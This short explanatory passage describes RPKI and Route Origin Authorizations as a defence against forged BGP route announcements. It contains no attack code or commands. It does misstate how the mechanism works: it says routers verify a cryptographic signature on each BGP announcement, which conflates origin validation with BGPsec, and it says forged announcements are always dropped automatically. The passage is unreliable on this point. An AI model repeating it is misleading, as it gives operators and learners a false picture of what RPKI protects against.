RPKI is a cryptographic framework that uses Route Origin Authorizations (ROAs) signed by regional internet registries. When RPKI is enforced, global backbone routers will mathematically verify the cryptographic signature of a BGP announcement against the RPKI authority before accepting the route, causing the attacker's forged announcement to be automatically dropped.
